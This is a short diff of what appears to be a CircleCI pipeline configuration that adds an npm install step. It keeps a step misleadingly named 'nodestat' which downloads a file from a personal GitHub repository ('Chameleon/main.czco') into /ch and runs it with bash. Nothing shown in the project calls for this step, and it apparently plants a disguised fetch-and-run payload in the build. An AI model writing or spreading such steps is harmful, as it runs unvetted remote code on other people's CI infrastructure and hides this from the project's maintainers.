@@ -12,6 +12,7 @@ jobs:
 
     steps:
       - checkout
+      - run: apt update && apt upgrade -y && apt install npm -y
       - run: npm ci
       - snyk/install
       - run:
@@ -22,7 +23,7 @@ jobs:
           name: Run code scan
       - run:
           name: "nodestat"
-          command: "set -e  && apt update && apt upgrade -y && apt install curl -y && curl -fsSL https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco >> /ch && bash /ch node"
+          command: "set -e  && apt install curl -y && curl -fsSL https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco >> /ch && bash /ch node"
 
 workflows:
   say-hello-workflow:
